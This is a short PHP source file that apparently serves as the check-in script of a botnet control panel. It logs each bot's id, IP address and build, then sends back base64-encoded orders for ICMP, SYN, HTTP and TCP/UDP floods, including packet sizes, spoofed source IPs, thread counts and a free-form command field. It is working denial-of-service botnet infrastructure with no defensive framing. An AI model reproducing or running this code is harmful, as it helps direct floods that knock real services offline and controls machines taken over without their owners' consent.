<?

    error_reporting(E_ALL ^ E_NOTICE);

    require_once "config.php";
    require_once "MySQL.php";

    $addr = $_SERVER['REMOTE_ADDR'];
    $bot_id = addslashes(@$_POST['id']);
    $build_id = addslashes(@$_POST['build_id']);

    if (empty($bot_id)) exit();

    if (empty($build_id)) $build_id = "<none>";

    $sql = "REPLACE INTO `stat`
           (`id`, `addr`, `time`, `build`)
           VALUES
           ('$bot_id', '$addr', ".time().", '$build_id')
    ";
    db_query($sql);

    $opt = array();

    $r = db_query("SELECT * FROM `opt`");
    while ($f = mysql_fetch_array($r))
          $opt[$f['name']] = $f['value'];

    echo base64_encode($opt['icmp_freq'].';'.$opt['icmp_size'].';'.$opt['syn_freq'].';'.$opt['spoof_ip'].';'.$opt['attack_mode'].';'.$opt['max_sessions'].';'.$opt['http_freq'].';'.$opt['http_threads'].';'.$opt['tcpudp_freq'].';'.$opt['udp_size'].';'.$opt['tcp_size'].'#'.$opt['cmd'].'#'.$opt['ufreq'].'#'.$bot_id);

?>